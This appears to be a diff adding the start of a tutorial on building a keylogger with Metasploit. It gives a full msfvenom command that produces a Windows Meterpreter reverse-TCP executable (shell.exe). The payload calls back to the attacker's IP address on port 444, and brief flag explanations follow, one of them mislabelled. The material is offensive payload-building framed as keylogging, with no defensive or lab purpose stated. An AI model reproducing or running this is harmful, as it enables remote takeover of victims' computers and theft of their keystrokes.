@@ -1,1 +1,13 @@
 Building the keylogger using Metasploit-framework
+
+PART 1
+Log in to kali linux software
+The aim is to create a payload called Meterpreter using Inbuilt Metasploit-framework[(see https://www.offsec.com/metasploit-unleashed/existing-scripts/)]
+
+
+ Meterpretershell
+   kali# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(HACKERS iP ADDRESS) LPORT=444 -f exe -o shell.exe (You can get the lists of payload in metasploitable)
+   p means- payload 
+   f means - output files in exe
+   0 means - output name which is shell.exe
+   How to make share folder btw windows and the kalis (solved)
